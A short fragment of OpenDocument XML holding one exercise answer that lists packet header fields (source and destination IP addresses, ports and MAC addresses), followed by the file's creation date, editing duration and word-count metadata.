      <text:p text:style-name="P11">2. Answer: src/dest IP address, src/dest port, src/dest MAC address,..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6:35:23.136379592</meta:creation-date>
    <dc:date>2016-01-14T09:07:48.361142961</dc:date>
    <meta:editing-duration>PT41M30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3" meta:paragraph-count="169" meta:word-count="616" meta:character-count="4818" meta:non-whitespace-character-count="3597"/>
  </office:meta>
</office:document-meta>
</file>